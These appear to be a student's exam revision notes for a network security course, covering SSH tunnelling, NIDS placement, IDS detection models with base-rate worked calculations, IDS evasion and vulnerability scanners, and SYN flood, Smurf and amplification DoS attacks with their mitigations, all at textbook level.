- **Local port forwarding**: Forward a port on the local machine through the SSH tunnel to a destination reachable from the SSH server. Use case: secure an unsecured local-to-remote application by routing it through SSH.
- **Remote port forwarding**: Forward a port on the SSH server back through the tunnel to a destination reachable from the local machine. Use case: expose a local service to the remote side.
- **Dynamic port forwarding**: Turn the SSH client into a SOCKS proxy. Any application configured to use that proxy has its traffic tunneled through SSH.

Each variant lets SSH carry traffic for protocols that have no encryption of their own.

#### Where SSH Sits in the Stack: SSH vs TLS vs IPsec

The Lecture 7 stack diagram is a frequent exam topic. The three security protocols sit at different layers:

| Protocol | Layer | What it protects |
|----------|-------|------------------|
| **TLS** | Transport (sits between application and TCP/UDP) | One application connection (e.g., HTTPS = HTTP over TLS). |
| **IPsec** | Network (sits beside IP) | All IP traffic between two endpoints or networks. |
| **SSH** | Application | One SSH connection, which may carry multiple tunneled streams. |

Memory trick: **TLS = transport, IPsec = network, SSH = application**.

### How It Works

SSH transport sub-protocol -> encrypts and integrity-protects the channel.
SSH authentication sub-protocol -> proves the client identity (password / Kerberos / public key).
SSH connection sub-protocol -> multiplexes sessions and port forwards inside one encrypted channel.

Server authentication -> host key verified against local known-hosts DB or via CA.

Port forwarding -> SSH client listens on a local port -> tunnels traffic through SSH -> SSH server delivers to the actual destination.

SSH sits at the application layer, TLS at transport, IPsec at network.

### What You Must Know

- The three SSH sub-protocols and what each does.
- The three client authentication methods (password, Kerberos ticket, public key).
- The two server-authentication trust models (local known-hosts DB vs CA-certified keys).
- SSH replaces rsh, rlogin, telnet, ftp, rcp.
- SCP is file transfer over an SSH tunnel.
- Local, remote, and dynamic port forwarding.
- TLS = transport, IPsec = network, SSH = application.

### 30-Second Oral Answer

- SSH has three sub-protocols: transport for encryption, authentication for client identity, connection for multiplexed sessions.
- Clients authenticate with passwords, Kerberos tickets, or public keys; servers prove identity with a host key trusted via a local database or a CA.
- SSH replaces insecure legacy protocols and can tunnel other applications via local, remote, or dynamic port forwarding.
- TLS is at the transport layer, IPsec at the network layer, SSH at the application layer.

### Typical Exam Questions

- Describe the three sub-protocols that make up SSH.
- Name the three client authentication methods SSH supports.
- Compare local and remote port forwarding.
- At which layer of the network stack does each of TLS, IPsec, and SSH operate?
- What insecure protocols does SSH replace, and why does the replacement matter?

### Common Pitfalls

- Calling SSH a transport-layer protocol because of the "transport sub-protocol" inside SSH. SSH sits at the application layer of the network stack; "transport" inside SSH is one of SSH's own layers.
- Believing that SSH and TLS protect the same things. TLS protects a specific TCP connection; SSH provides a multiplexable channel and can tunnel other protocols.
- Forgetting that local known-hosts is trust-on-first-use — the first connection establishes trust, so an attacker active at first connection can substitute their key.

### Concrete Examples and Commands

#### Local port forwarding example

```text
ssh -L 8080:internal-db:5432 user@bastion

Effect: a connection to localhost:8080 is tunneled through SSH to bastion,
        which then connects to internal-db:5432.
```

#### Remote port forwarding example

```text
ssh -R 9000:localhost:3000 user@server

Effect: a connection to server:9000 is tunneled back through SSH to the
        local machine and delivered to localhost:3000.
```

#### Dynamic port forwarding (SOCKS proxy)

```text
ssh -D 1080 user@bastion

Effect: any application configured to use SOCKS proxy localhost:1080 has
        its traffic tunneled through SSH to bastion.
```

#### Layered protocol picture

```text
Application:      HTTP, FTP, DNS, ...           SSH
Transport:        TCP, UDP                      TLS
Network:          IP, ICMP                      IPsec
Link:             Ethernet, Wi-Fi, ARP
```

### Related Concepts

- [[Firewalls, DMZs, Proxy Firewalls, SSH Tunnels, and VPNs|Firewalls, DMZs, Proxy Firewalls, SSH Tunnels, and VPNs]]
- [[Firewall Policy Design, Bastion Hosts, and Port Knocking|Firewall Policy Design, Bastion Hosts, and Port Knocking]]
- [[Man-in-the-Middle Scenarios — LAN, DNS, Wireless, Transport|Man-in-the-Middle Scenarios — LAN, DNS, Wireless, Transport]]

## Packet Sniffing, Promiscuous Mode, Switched LANs, and NIDS Visibility

> [!abstract] Why this note matters
> - Lecture 8 and Tutorial L8 explicitly include packet sniffing and switched-LAN capture limitations.
> - This fills the source gap between generic IDS ideas and what a network sensor can actually observe.

### Overview

NIDS quality depends on visibility as much as on detection logic. If the sensor cannot see the traffic, it cannot analyze it, regardless of how good its detection algorithm is.

The course includes switched-LAN reasoning to make this operational point explicit: network architecture limits passive observation.

### Exam Focus

- Tier 2 priority.
- Written to align with the provided lectures, tutorials, solutions, labs, and syllabus.

### Core Definitions

- **packet sniffing**: Capturing and inspecting traffic in transit for analysis.
- **promiscuous mode**: A NIC mode that accepts more observed traffic for software inspection instead of only strictly addressed frames.
- **switched LAN**: A LAN where switches selectively forward frames instead of flooding all traffic to every port.
- **sensor visibility**: The subset of traffic a monitoring system can actually observe from its placement and network context.

### Detailed Explanation

Packet sniffing is how many NIDS implementations gather traffic. The sniffer captures packets and passes them to analysis logic. That sounds simple until the network only forwards relevant traffic to specific ports.

Promiscuous mode helps a NIC accept traffic that reaches it, but it does not magically make a switched network behave like a hub. If the switch never forwards unrelated frames to the sensor port, those packets remain invisible to the sensor.

This is why strategic placement matters. On a switched LAN, observation often depends on mirror ports, taps, or gateway placement rather than simply running a sniffer on any host.

The security lesson is broader than one hardware detail: monitoring quality depends on vantage point. If defenders forget that, they may overestimate what their NIDS can see and therefore overestimate what their alerts or silence actually mean.

### How It Works

Hub-like forwarding -> broad passive visibility.

Switched forwarding -> visibility depends on placement and mirroring.

Promiscuous mode helps consume available traffic, not create unavailable traffic.

### What You Must Know

- What packet sniffing is.
- What promiscuous mode does and does not do.
- Why switched LANs reduce arbitrary passive visibility.
- Why NIDS placement matters.

### 30-Second Oral Answer

- A NIDS can only inspect what it can actually see.
- Promiscuous mode does not override switching decisions; switched LANs therefore make passive observation placement-sensitive.

### Typical Exam Questions

- Why is packet sniffing harder on a switched LAN than on a hub?
- What does promiscuous mode do?
- Why does NIDS placement matter?

### Common Pitfalls

- Thinking promiscuous mode alone guarantees full LAN visibility.
- Ignoring network topology when discussing NIDS effectiveness.
### Related Concepts

- [[IDS, IPS, HIDS, NIDS, and Detection Models|IDS, IPS, HIDS, NIDS, and Detection Models]]
- [[Kali Linux, Nmap, Wireshark, and Responsible Tool Use|Kali Linux, Nmap, Wireshark, and Responsible Tool Use]]

## IDS, IPS, HIDS, NIDS, and Detection Models

> [!abstract] Why this note matters
> - Lecture 8 and Tutorial L8 are built around intrusion detection and prevention concepts.
> - This topic produces both conceptual and calculation-style exam questions because of base-rate reasoning.

### Overview

Firewalls are coarse gatekeepers. IDS and IPS exist because many threats still get through allowed channels or arise inside the perimeter. The course treats these systems as monitoring and response layers rather than as magic all-purpose defenses.

This topic also introduces a common reasoning trap in security: a detection system can have good raw rates and still produce mostly false alarms if actual attacks are rare. That is the base-rate problem.

### Exam Focus

- Tier 1 priority.
- Written to align with the provided lectures, tutorials, solutions, labs, and syllabus.

### Core Definitions

- **IDS**: Intrusion Detection System; monitors and reports suspicious activity.
- **IPS**: Intrusion Prevention System; can actively block or alter traffic or behavior to stop intrusions.
- **HIDS**: Host-based IDS; monitors one host's logs, file system, kernel activity, or similar local data.
- **NIDS**: Network-based IDS; monitors network packets at strategic points.
- **signature-based detection**: Detection based on known malicious patterns.
- **anomaly-based detection**: Detection based on deviations from a model of normal behavior.
- **specification-based detection**: Detection based on explicit rules for what acceptable behavior should look like.

### Detailed Explanation

An IDS observes and alerts; an IPS goes further by taking action, such as blocking traffic or changing configuration. The distinction matters because prevention introduces response power and the risk of automated mistakes.

NIDS see traffic at network points, while HIDS see host-local events such as logs, file changes, or kernel behavior. NIDS provide broader visibility into packet flows, while HIDS provide deeper host context.

Signature-based systems are good for known attacks but weak for novel ones. Anomaly-based systems can, in principle, detect new behavior, but they often suffer from false positives because normal behavior is hard to model perfectly. Specification-based systems rely on explicit allowed-behavior rules rather than learned baselines.

Tutorial L8 emphasizes the base-rate effect. If real attacks are rare, then even a low false-positive rate can generate many more false alarms than true ones. This is why operational context and human review matter so much in intrusion detection.

The tutorial material also makes the false-negative concept explicit. Missing a real attack can be quieter than raising too many alarms, but it may be more dangerous operationally because compromise continues unnoticed. So alarm quality must be judged using both kinds of error, not only false positives.

### How It Works

IDS -> alerting and evidence collection.

IPS -> active blocking or response.

HIDS -> host-local observations; NIDS -> network observations.

Low attack prevalence + nonzero false-positive rate -> many alarms may still be false.

### What You Must Know

- Difference between IDS and IPS.
- Difference between HIDS and NIDS.
- Differences among signature-based, anomaly-based, and specification-based detection.
- Why low base rates can make many alarms false alarms in practice.

### 30-Second Oral Answer

- IDS detects; IPS detects and can respond.
- HIDS watches a host, NIDS watches traffic, and each has different visibility strengths.
- Anomaly detection is flexible but noisy; signature detection is precise for known attacks but blind to unknown ones.

### Typical Exam Questions

- What is the difference between IDS and IPS?
- What is the base-rate problem in intrusion detection?
- Why can anomaly-based systems have many false positives?
- What does a HIDS monitor that a NIDS may not see directly?

### Common Pitfalls

- Assuming anomaly detection is automatically better because it can detect unknown attacks.
- Ignoring the prevalence of attacks when interpreting alarm quality.
### Related Concepts

- [[Firewalls, DMZs, Proxy Firewalls, SSH Tunnels, and VPNs|Firewalls, DMZs, Proxy Firewalls, SSH Tunnels, and VPNs]]
- [[Packet Sniffing, Promiscuous Mode, Switched LANs, and NIDS Visibility|Packet Sniffing, Promiscuous Mode, Switched LANs, and NIDS Visibility]]
- [[DDoS, Alarm Quality, and Detection Interpretation|DDoS, Alarm Quality, and Detection Interpretation]]
- [[ARP Spoofing, DNS Cache Poisoning, and Traffic Redirection|ARP Spoofing, DNS Cache Poisoning, and Traffic Redirection]]

## IDS Confusion Matrix and Base-Rate Worked Examples

> [!abstract] Why this note matters
> - Lecture 8 and Tutorial L8 Part C both pose calculation-style questions that depend on the IDS confusion matrix.
> - The base-rate problem produces some of the most counter-intuitive results in the course; without practising the arithmetic, the conclusion ("most alarms are false even with a 95% detector") feels wrong.
> - Worked examples here mirror the exact tutorial drills so the same template can be applied in the exam.

### Overview

Intrusion detection is binary classification: each event is either an intrusion or not, and the IDS either alarms or does not. Four outcomes are possible — true positive, false positive, false negative, true negative — and they form the confusion matrix.

From this matrix the course derives five metrics: FPR, TPR (detection rate), FNR, TNR, and AP (alarm precision). The base-rate problem then shows why these metrics can mislead: when actual intrusions are rare, even a low false-positive rate produces overwhelmingly many false alarms.

This note compiles the formulas, the confusion matrix, and the two worked drills from Tutorial L8 Part C so the same arithmetic can be reused in the exam.

### Exam Focus

- Tier 1 priority — Tutorial L8 Part C contains calculation drills that match likely exam questions exactly.
- Written to align with the provided lectures, tutorials, solutions, labs, and syllabus.

### Core Definitions

- **True Positive (TP)**: An intrusion occurred and the IDS raised an alarm.
- **False Positive (FP)**: No intrusion occurred but the IDS raised an alarm.
- **False Negative (FN)**: An intrusion occurred but the IDS did not raise an alarm.
- **True Negative (TN)**: No intrusion occurred and the IDS did not raise an alarm.
- **base rate**: The prior probability that an arbitrary event is an actual intrusion.
- **alarm fatigue**: The operational degradation when a security team learns to ignore alarms because most of them are false.

### The Confusion Matrix

|                       | intrusion (positive)    | no intrusion (negative) |
|-----------------------|-------------------------|-------------------------|
| **alarm raised**      | TP — intrusion detected | FP — false alarm        |
| **no alarm raised**   | FN — intrusion missed   | TN — normal operation   |

### Detailed Explanation

#### The Five Formulas

| Metric | Formula | Meaning |
|--------|---------|---------|
| **True Positive Rate (TPR)** | `TPR = TP / (TP + FN)` | Fraction of real intrusions that are detected. Also called the detection rate or recall. |
| **False Positive Rate (FPR)** | `FPR = FP / (FP + TN)` | Fraction of benign events incorrectly alarmed on. |
| **Alarm Precision (AP)** | `AP = TP / (TP + FP)` | Fraction of alarms that are correct. The metric an operator actually feels. |
| **True Negative Rate (TNR)** | `TNR = 1 - FPR` | Fraction of benign events correctly left alone. |
| **False Negative Rate (FNR)** | `FNR = 1 - TPR` | Fraction of real intrusions missed. |

The two useful identities — TNR = 1 - FPR and FNR = 1 - TPR — are time-savers in the exam.

#### The Base-Rate Problem in One Sentence

If intrusions are rare, **alarm precision (AP) collapses even when TPR and FPR look good**, because the denominator of AP is dominated by false positives generated from the huge number of benign events.

#### Why Two Errors, Not One

The course insists that both FPR and FNR matter:

- High FPR -> alarm fatigue -> real alarms get ignored.
- High FNR -> missed intrusions -> silent compromise.

A single number (e.g., "accuracy") hides this trade-off, which is why the exam emphasises both metrics separately.

### Worked Examples

#### Worked Example 1 — Tutorial L8 Part C, Q1: False Positives and Negatives

**Setup.** IDS has FPR = 2%, TPR = 90%. Daily events: 200 real intrusions, 10,000 non-intrusive events.

**False negatives.** FNR = 1 - TPR = 10%. FN = 0.10 × 200 = **20 missed intrusions**.

**False positives.** FP = FPR × benign events = 0.02 × 10,000 = **200 false alarms**.

**Insight.** The IDS produces 200 false alarms per day and misses 20 real intrusions. Even with a 2% FPR, the absolute number of false alarms equals the count of real intrusions in this scenario.

#### Worked Example 2 — Tutorial L8 Part C, Q2: Anomaly Alert Volume

**Setup.** 1,000,000 events/day; 200 are real attacks; TPR = 90%; FPR = 2%.

**Real detections.** TP = 0.90 × 200 = **180 true positives**.

**False alarms.** FP = 0.02 × (1,000,000 - 200) = 0.02 × 999,800 = **19,996 false positives**.

**Total alarms.** Total = 180 + 19,996 ≈ **20,176 alarms**, of which only **180 are real** — roughly 0.9% alarm precision.

**Insight.** This is the operational version of the base-rate problem. A 90% detection rate sounds excellent, but the analyst sees twenty thousand alarms a day and 99% of them are spurious.

#### Worked Example 3 — Tutorial L8 Part B, Q2: Base-Rate Drill

**Setup.** TPR = 95%, FPR = 1%, attack rate 1 per 10,000 events, total 100,000 events.

**Attacks.** 100,000 × (1/10,000) = **10 attacks**.

**Detected attacks.** TP = 0.95 × 10 ≈ **9 (specifically 9.5)**.

**Non-attacks.** 100,000 - 10 = 99,990.

**False alarms.** FP = 0.01 × 99,990 ≈ **1,000 (specifically 999.9)**.

**Result.** Roughly **9 true positives vs ~1,000 false positives**. Alarm precision ≈ 9 / 1,009 ≈ 0.9%.

**Insight.** This is the canonical base-rate fallacy result. A 95% detector with a 1% FPR generates a hundred times more false alarms than real ones when attacks are rare. The lecture term for the operational consequence is **alarm fatigue**.

#### Worked Example 4 — Tutorial L8 Part C, Q4: DoS Bandwidth

**Setup.** Attacker floods at 100,000 pps (packets per second), each packet 512 bytes.

**Bytes per second.** 100,000 × 512 = 51,200,000 bytes/s = **51.2 MB/s**.

**Bits per second.** 51,200,000 × 8 = 409,600,000 bits/s = **~410 Mbps**.

**Saturation check.** Target uplink = 100 Mbps. Attack is ~410 Mbps. **Yes, this saturates the link** (about 4× over capacity, ignoring overhead).

**Insight.** A modest packet-per-second rate at moderate packet size easily saturates a 100 Mbps link. The arithmetic is mechanical but the exam expects bits-versus-bytes care.

### How It Works

Build the 2×2 confusion matrix -> compute TP, FP, FN, TN from rates and event counts -> derive TPR, FPR, AP, TNR, FNR.

Base-rate problem: rare attacks + many benign events -> FP dominates the numerator of total alarms -> AP collapses even when TPR is high.

DoS bandwidth: pps × bytes per packet × 8 -> bits per second -> compare to link capacity.

### What You Must Know

- The confusion matrix layout (alarm raised × intrusion present).
- The five formulas: TPR, FPR, AP, TNR = 1 - FPR, FNR = 1 - TPR.
- The base-rate problem: rare events make alarm precision collapse.
- The Tutorial L8 Part C arithmetic templates.
- DoS bandwidth conversion: pps × bytes × 8 = bits per second.

### 30-Second Oral Answer

- The IDS confusion matrix has four cells (TP, FP, FN, TN); the five metrics derive from it.
- TPR = TP/(TP+FN), FPR = FP/(FP+TN), AP = TP/(TP+FP), with TNR = 1-FPR and FNR = 1-TPR as shortcuts.
- When the base rate of attacks is low, a small FPR still produces many more false alarms than real ones — that is the base-rate problem and it causes alarm fatigue.

### Typical Exam Questions

- Given TPR = 90% and FPR = 2%, with 200 intrusions and 10,000 benign events, compute false negatives and false positives. *(Answer: 20 FN, 200 FP.)*
- An IDS with TPR = 95% and FPR = 1% sees 100,000 events with attacks at 1 in 10,000. How many true vs false alarms? *(Answer: ~9 TP vs ~1,000 FP.)*
- An attacker sends 100,000 pps at 512 bytes per packet. What bandwidth is this in Mbps, and can it saturate a 100 Mbps link? *(Answer: ~410 Mbps; yes.)*
- Why does an anomaly-based IDS with low FPR still produce mostly false alarms when intrusions are rare?

### Common Pitfalls

- Mixing up TPR's denominator (real intrusions, TP+FN) with FPR's denominator (benign events, FP+TN). They are different totals.
- Reporting AP as the "false positive rate". AP is alarm precision; FPR is fraction of benigns alarmed on. They are very different.
- Forgetting the bits-versus-bytes factor of 8 in DoS bandwidth calculations.
- Stating "the IDS is 95% accurate, so 95% of alarms are correct". The relationship between TPR and AP depends on the base rate.

### Concrete Examples and Commands

#### Confusion-matrix template

```text
                  intrusion present       no intrusion
alarm raised        TP (true positive)    FP (false positive)
no alarm raised     FN (false negative)   TN (true negative)

TPR = TP / (TP + FN)
FPR = FP / (FP + TN)
AP  = TP / (TP + FP)
TNR = 1 - FPR
FNR = 1 - TPR
```

#### Tutorial L8 Part C drill template

```text
Given: TPR, FPR, base rate, total events N
Step 1: Real intrusions = base rate × N
Step 2: Benign events   = N - real intrusions
Step 3: TP = TPR × real intrusions
Step 4: FP = FPR × benign events
Step 5: AP = TP / (TP + FP)   <-- the operational truth
```

#### DoS bandwidth template

```text
Given: pps (packets/s), bytes per packet
bytes/s = pps × bytes
bits/s  = bytes/s × 8
Mbps    = bits/s / 1,000,000
Compare to link capacity; saturates if Mbps > link capacity.
```

### Related Concepts

- [[IDS, IPS, HIDS, NIDS, and Detection Models|IDS, IPS, HIDS, NIDS, and Detection Models]]
- [[DDoS, Alarm Quality, and Detection Interpretation|DDoS, Alarm Quality, and Detection Interpretation]]
- [[IDS Evasion, Vulnerability Scanners, and Advanced Detection|IDS Evasion, Vulnerability Scanners, and Advanced Detection]]
- [[SYN Flooding, Smurf, Amplification, and DoS Techniques|SYN Flooding, Smurf, Amplification, and DoS Techniques]]

## IDS Evasion, Vulnerability Scanners, and Advanced Detection

> [!abstract] Why this note matters
> - Tutorial L8 Part B Q10 asks for two IDS evasion techniques and how modern IDS counters them.
> - Tutorial L8 Part B Q5 asks how vulnerability scanners like Nessus work and their limitations.
> - These are extension topics on top of the IDS/IPS note — tested in Part B long-answer form.

### Overview

An IDS can only protect what it can see and understand. IDS evasion exploits the gap between what the IDS observes and what the target system actually executes. Vulnerability scanners are the offensive counterpart: automated tools that probe systems to find weaknesses before attackers do — but they have limitations that defenders must understand.

### Exam Focus

- Tier 2 priority.
- Written to align with the provided lectures, tutorials, solutions, labs, and syllabus.

### Core Definitions

- **IDS evasion**: A technique that causes an IDS to miss or misclassify an attack by manipulating how traffic is presented to the sensor.
- **fragmentation evasion**: Splitting an attack payload across multiple small IP or TCP fragments so no single fragment contains the full malicious signature.
- **polymorphic shellcode**: Attack code that changes its byte-level representation on each use (e.g., by encrypting the payload) to avoid matching a static signature.
- **stream reassembly**: The IDS technique of reconstructing full TCP streams or IP fragments to see the complete payload as the target host sees it.
- **vulnerability scanner**: An automated tool that tests a target system against a database of known vulnerabilities, misconfigurations, and weak service versions.
- **false positive (scanner)**: A scanner report of a vulnerability that does not actually exist on the target.

### Detailed Explanation

#### IDS Evasion Techniques

##### 1. Fragmentation / Unusual Segment Ordering

IP fragmentation splits packets into smaller pieces. A naive IDS might inspect each fragment independently and fail to find a multi-fragment attack signature.

Similarly, TCP allows segment data to arrive out of order. An IDS that processes segments as they arrive may see harmless partial data, while the target host's TCP stack reassembles them into the malicious payload.

**Modern IDS countermeasure**: Full stream reassembly and IP fragment reassembly before signature matching. The IDS buffers fragments/segments, reassembles them as the target would, and then applies signatures to the reconstructed payload.

##### 2. Polymorphic Shellcode / Payload Encryption / Encoding

Signature-based IDS match known byte patterns. If the attacker encrypts or encodes the payload and includes a small decoder stub, the payload bytes change each time while the decoded result is the same attack.

Example: XOR-encode the shellcode with a random key. The IDS sees different bytes on every attack; the target decodes it with the key included in the traffic.

**Modern IDS countermeasure**:
- Emulation or sandboxing: run the payload in a safe virtual environment to observe decoded behaviour.
- Anomaly or behaviour-based detection rather than pure signature matching.
- Multi-layer signatures that match structural properties (e.g., the decoder stub pattern) rather than only the payload content.

##### 3. Other Evasion Techniques (awareness)

- **Protocol ambiguity**: Sending malformed headers that an IDS handles differently from the target OS.
- **Slow-rate attacks**: Spreading attack traffic over a long time to avoid rate-based thresholds.
- **Encryption**: Tunnelling attacks through HTTPS or other encrypted channels that the IDS cannot inspect without SSL termination.

#### Vulnerability Scanners

A vulnerability scanner is a tool (e.g., Nessus, OpenVAS, Qualys) that automates the process of identifying known security weaknesses in a system.

**How they work:**
1. **Discovery**: Identify live hosts (ping sweeps, port scans via Nmap-style probing).
2. **Service identification**: Detect running services and version strings from banners, response patterns.
3. **Plugin-based testing**: Apply a library of plugins, each testing for a specific known CVE, misconfiguration, or weak default (e.g., default credentials, outdated OpenSSL version).
4. **Reporting**: Generate a list of findings ranked by severity (CVSS score).

**Limitations:**

1. **Zero-days and unknown vulnerabilities**: Scanners only detect what is in their plugin database. Novel or undisclosed vulnerabilities are invisible.

2. **False positives**: Version-based detection is imprecise. A service may report version X but have backported patches that fix the vulnerability. The scanner flags it as vulnerable when it is not.

3. **Disruption risk**: Some scan techniques (e.g., exploit verification, heavy port probing) can crash fragile services, especially embedded devices or legacy systems.

4. **Credentialed vs uncredentialed scanning**: Uncredentialed scans see only what an external attacker sees. Credentialed scans (providing login credentials to the scanner) find far more issues but require granting the scanner elevated access.

5. **Scope coverage**: Scanners test the exposed attack surface but may miss vulnerabilities in application logic, custom code, or third-party integrations.

### How It Works

Fragmentation evasion → split payload across fragments → IDS reassembles to counter → overhead increases.

Polymorphic payload → encode bytes to avoid signature → IDS emulates execution to counter → more resource-intensive.

Scanner → discover → identify services → apply CVE plugin database → report → limitations: zero-days, false positives, disruption risk.

### What You Must Know

- Two evasion techniques: fragmentation and polymorphic/encoded payloads.
- How modern IDS counters each: stream reassembly and emulation/anomaly detection.
- How vulnerability scanners work at a high level (discovery → service ID → plugin testing → reporting).
- Two limitations of vulnerability scanners: zero-days and false positives.

### 30-Second Oral Answer

- IDS evasion exploits the gap between what the sensor sees and what the target executes; fragmentation hides payloads across packets; polymorphic shellcode changes byte patterns.
- Modern IDS counter fragmentation with stream reassembly and polymorphism with emulation or behavioural detection.
- Vulnerability scanners automate CVE-based testing but miss zero-days, can produce false positives from version banners, and may disrupt fragile targets.

### Typical Exam Questions

- Name two IDS evasion techniques and explain how modern IDS might counter them.
- How does a vulnerability scanner like Nessus work? Name two limitations.
- Why does fragmentation-based evasion work against naive signature-based IDS but fail against stream-reassembling IDS?

### Common Pitfalls

- Thinking encryption completely defeats all IDS — SSL inspection and anomaly detection can still catch patterns.
- Confusing scanner false positives (vulnerability reported that doesn't exist) with IDS false positives (benign traffic flagged as attack) — both are false positives but in different tools.
- Claiming vulnerability scanners provide complete coverage — they only cover known, catalogued vulnerabilities.

### Related Concepts

- [[IDS, IPS, HIDS, NIDS, and Detection Models|IDS, IPS, HIDS, NIDS, and Detection Models]]
- [[DDoS, Alarm Quality, and Detection Interpretation|DDoS, Alarm Quality, and Detection Interpretation]]
- [[Polymorphic and Metamorphic Malware Evasion|Polymorphic and Metamorphic Malware Evasion]]
- [[Kali Linux, Nmap, Wireshark, and Responsible Tool Use|Kali Linux, Nmap, Wireshark, and Responsible Tool Use]]

## DDoS, Alarm Quality, and Detection Interpretation

> [!abstract] Why this note matters
> - Tutorial L8 and the retained corpus include DDoS, false negatives, and alarm-quality interpretation.
> - This fills a source-backed gap between raw IDS definitions and practical monitoring interpretation.

### Overview

The course does not only ask what IDS and IPS are. It also asks how to interpret detector output and where availability-focused attacks such as DDoS fit into operational security reasoning.

This matters because an alarm stream is only useful if the analyst can explain what it means and what kinds of error are likely present.

### Exam Focus

- Tier 2 priority.
- Written to align with the provided lectures, tutorials, solutions, labs, and syllabus.

### Core Definitions

- **DDoS**: Distributed Denial of Service; overwhelming a target with requests or traffic from many distributed sources.
- **false positive**: Benign activity incorrectly flagged as malicious.
- **false negative**: A real intrusion or attack that the detector fails to flag.
- **base-rate problem**: The phenomenon where alarms can be mostly false when attacks are rare, even if the detector's raw error rate looks low.

### Detailed Explanation

DDoS attacks target availability by flooding or overwhelming a service using many sources. The difficulty is not only stopping the traffic but also distinguishing malicious large-scale load from benign surges such as flash crowds.

False positives consume attention and reduce trust in the system. False negatives are quieter but may be worse because real attacks proceed without response. Security monitoring therefore needs both detection power and reasonable interpretability.

The base-rate problem ties these together. If true attacks are rare, then even a low false-positive rate over a huge number of benign events can produce many more false alarms than true positives. That is why prevalence matters when evaluating alarms.

### How It Works

DDoS -> availability attack via distributed overload.

False positive -> alert on benign event.

False negative -> miss real attack.

Low base rate -> many alarms may still be false despite decent raw detector numbers.

### What You Must Know

- What DDoS is at a high level.
- Difference between false positives and false negatives.
- Why the base-rate problem matters operationally.

### 30-Second Oral Answer

- DDoS attacks availability through distributed load, and detector quality must be understood through both false positives and false negatives.
- Low attack prevalence makes alarm interpretation harder than raw percentages alone suggest.

### Typical Exam Questions

- What is a false negative?
- Why can most alarms be false even if the detector's false-positive rate is low?
- How can a DDoS and a flash crowd be difficult to distinguish at first glance?

### Common Pitfalls

- Judging alarm quality from false-positive rate alone.
- Assuming every traffic spike is a DDoS.
### Related Concepts

- [[IDS, IPS, HIDS, NIDS, and Detection Models|IDS, IPS, HIDS, NIDS, and Detection Models]]
- [[Security Goals, Policy, Adversaries, and Risk|Security Goals, Policy, Adversaries, and Risk]]

## SYN Flooding, Smurf, Amplification, and DoS Techniques

> [!abstract] Why this note matters
> - Tutorial L8 Part B Q8 asks to explain SYN flooding and how SYN cookies mitigate it.
> - Tutorial L8 Part B Q9 asks about Smurf/amplification attacks and modern mitigations.
> - Tutorial L8 Part C Q4 calculates DoS bandwidth — directly numeric.

### Overview

Denial-of-Service attacks exhaust a target's resources so legitimate users cannot be served. The course covers two specific mechanisms: SYN flooding (resource exhaustion via incomplete TCP handshakes) and Smurf/amplification attacks (traffic amplification using spoofed broadcast requests). Both are instructive models for how modern DDoS attacks are structured.

### Exam Focus

- Tier 2 priority.
- Written to align with the provided lectures, tutorials, solutions, labs, and syllabus.

### Core Definitions

- **SYN flood**: A DoS attack where the attacker sends many TCP SYN packets but never completes the three-way handshake, exhausting the server's half-open connection table.
- **half-open connection**: A TCP connection in the SYN_RECEIVED state, waiting for the client's final ACK, consuming server resources.
- **SYN cookies**: A mitigation technique where the server encodes connection state into the SYN-ACK's initial sequence number rather than allocating a table entry; resources are only committed when the final ACK arrives.
- **Smurf attack**: An ICMP-based amplification DoS where the attacker sends ICMP echo requests with a spoofed source IP (the victim's IP) to a broadcast address, causing all hosts on the subnet to reply to the victim.
- **amplification factor**: The ratio of response traffic to request traffic; a factor of 100 means 1 byte of attacker traffic produces 100 bytes of traffic at the victim.
- **directed broadcast**: A broadcast sent to all hosts on a specific subnet (e.g., 192.168.1.255), now typically blocked by modern routers.

### Detailed Explanation

#### SYN Flooding

The TCP three-way handshake is: SYN → SYN-ACK → ACK.

In a SYN flood:
1. Attacker sends many SYN packets, often with spoofed source IPs.
2. Server allocates a half-open connection entry and sends SYN-ACKs.
3. No ACK ever arrives (spoofed source IP means replies go nowhere).
4. The half-open connection table fills up.
5. Legitimate connection attempts are rejected because the table is full.

**SYN Cookies (mitigation):**

Instead of allocating a table entry on SYN arrival, the server encodes all necessary connection state (IP addresses, port numbers, timestamp, etc.) into a cryptographic hash and places it in the ISN (Initial Sequence Number) of the SYN-ACK:

```text
Server receives SYN → computes ISN = hash(src_ip, src_port, dst_ip, dst_port, timestamp, secret)
Server sends SYN-ACK with that ISN — no table entry allocated
If legitimate client sends ACK: ISN-1 is in the ACK number
Server recomputes the hash to verify, then allocates connection
If no ACK: no resources consumed
```

Effect: Spoofed SYN packets never produce resource consumption because no table entry is made. The state is reconstructed from the packet if a real ACK arrives.

**Limitation of SYN cookies:** Some TCP options (like window scaling) cannot be preserved in the cookie; these connections fall back to default settings.

#### Smurf Attack

1. Attacker sends ICMP echo request (ping) to a subnet's broadcast address (e.g., 255.255.255.255 or 192.168.1.255).
2. Source IP is spoofed to the victim's IP.
3. All hosts on the subnet reply to the victim's IP with ICMP echo replies.
4. With N hosts on the subnet, the victim receives N packets for every 1 the attacker sent → amplification factor = N.

**Modern mitigations:**
- **Block directed broadcasts at routers**: Most modern routers disable `ip directed-broadcast` by default, preventing forwarding of broadcast ICMP to the subnet.
- **Ingress filtering (BCP38)**: Network providers drop packets with source IPs that don't belong to their address space, preventing IP spoofing at the source.

#### General Amplification Attacks (DRDoS)

The Smurf principle generalises to any protocol where a small request produces a large response, especially when the source IP can be spoofed (UDP-based protocols):

- **DNS amplification**: Small DNS query → large DNS response (50x+ amplification).
- **NTP amplification**: `monlist` command → dump of 600 recent clients (hundreds of bytes per 8-byte request).
- **SSDP, Memcached**: Similar amplification ratios.

All share the same structure: spoofed source + stateless protocol + large response.

#### DoS Bandwidth Calculation

```text
Attacker sends: 100,000 packets per second (pps)
Each packet: 512 bytes

Traffic in bytes/sec = 100,000 × 512 = 51,200,000 bytes/sec
In MB/s = 51,200,000 / 1,000,000 = 51.2 MB/s
In Mbps = 51.2 × 8 = 409.6 Mbps ≈ 410 Mbps

If target uplink = 100 Mbps → yes, this saturates it.
```

### How It Works

SYN flood → fill half-open connection table → server refuses new connections → DoS.

SYN cookies → encode state in SYN-ACK's ISN → no table entry → resource only committed on real ACK.

Smurf → spoof victim IP + broadcast ping → all subnet hosts reply to victim → amplified flood.

DRDoS → spoof victim IP + stateless UDP request → large response floods victim.

### What You Must Know

- The mechanics of SYN flooding and why it exhausts server resources.
- How SYN cookies work and why they prevent resource exhaustion.
- How the Smurf attack achieves amplification and how modern networks block it.
- The amplification factor concept and that it generalises to DNS/NTP/SSDP.
- DoS bandwidth calculation: pps × bytes/packet × 8 = Mbps.

